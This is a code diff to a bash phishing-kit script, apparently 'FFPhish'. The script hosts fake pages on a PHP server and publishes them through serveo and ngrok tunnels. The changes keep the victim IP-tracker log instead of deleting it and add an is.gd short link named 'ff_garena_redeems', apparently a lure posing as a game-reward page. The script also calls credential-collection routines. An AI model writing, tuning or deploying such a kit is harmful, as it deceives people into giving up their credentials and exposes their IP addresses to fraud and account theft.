@@ -193,7 +193,7 @@ printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" "$ip_currency"
 fi
 ##
 printf "\n"
-rm -rf iptracker.log
+
 
 getcredentials
 
@@ -216,7 +216,7 @@ sleep 5 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' "$send_link"
-send_link2=$"http://is.gd/create.php?format=simple&url=$send_link"
+send_link2=$"http://is.gd/create.php?format=simple&url=$send_link&shorturl=ff_garena_redeems"
 #echo $link2
 
 send_ip=$(lynx --dump "$send_link2")
@@ -302,14 +302,14 @@ port="${port:-${default_port}}"
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd FFPhish/$server && php -S 127.0.0.1:"$port" > /dev/null 2>&1 & 
-sleep 2
+sleep 5
 
 #cd ..
 #cd ..
 cd $HOME
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http "$port"  > /dev/null 2>&1 &
-sleep 5
+sleep 10
 
 #cd FFPhish
 
@@ -321,7 +321,7 @@ link2=$"http://is.gd/create.php?format=simple&url=$link"
 
 send_ip=$(lynx --dump "$link2")
 
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' "$send_ip"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m%s\n' "$send_ip"
 printf "\n"
 
 checkfound
